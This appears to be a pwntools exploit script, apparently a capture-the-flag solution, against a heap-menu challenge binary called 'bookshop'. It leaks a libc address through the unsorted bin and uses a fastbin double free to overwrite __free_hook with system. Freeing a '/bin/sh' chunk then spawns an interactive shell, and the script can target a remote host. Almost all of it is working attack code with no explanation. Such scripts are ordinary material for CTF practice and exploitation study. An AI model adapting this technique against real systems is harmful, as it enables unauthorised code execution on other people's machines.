#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './bookshop'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)
 
if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline() 
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
itr = lambda :p.interactive() 
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

def log(name,value):
	print "[-]%s"%name + hex(value)

def menu(idx):
    ru('>> ')
    sl(str(idx))

def begin(size):
	ru('The lucky number?\n')
	sl(str(size))

def add(content):
	menu(1)
	ru('> ')
	sl(content)

def free(idx):
	menu(2)
	ru('Which Book do you want to take out from you bag?\n')
	sl(str(idx))

def show(idx):
	menu(3)
	ru('Which Book do you want to read?\n')
	sl(str(idx))


# bp()
begin(0x60)
#leak
for i in range(7):
	add('Gl0w')
add('Gl0w')#7
add('Gl0w')#8
add('Gl0w')#9
add("Gl0w")#10
add("Gl0w")#11
add("Gl0w")#12

for j in range(7):
	free(j)

free(7)
free(8)

sla(">> ", "1" * 0x500)

show(7)
ru('Content: ')

offset = 304 + libc.sym['__malloc_hook'] + 0x10
libc_base = leak(offset)
# bp()
free(11)
free(12)
free(11)

#14-21
add("/bin/sh\x00")
for i in range(6):
	add("/bin/sh\x00")

free_hook = libc_base + libc.sym['__free_hook']
# one = p64(libc_base + 0xe6c84)
system = libc_base + sym("system")

add(p64(free_hook))

add("/bin/sh\x00")
add("/bin/sh\x00")
add(p64(system ))
pause()
free(15)

p.interactive()